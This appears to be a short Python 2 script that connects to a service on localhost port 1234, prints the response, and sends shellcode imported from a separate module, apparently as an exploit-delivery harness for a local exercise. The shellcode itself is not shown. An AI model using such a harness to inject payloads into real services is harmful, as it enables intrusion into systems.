#!/usr/bin/env python
import sys
import socket as sk
from shellcode import shellcode

host = 'localhost'
port = 1234

address = (host, port)

def main():
    obj = sk.socket()
    obj.connect(address)
    a = obj.recv(4096)
    print repr(a)
    obj.sendall(shellcode)
    a = obj.recv(4096)
    print repr(a)

if __name__ == '__main__':
    main()
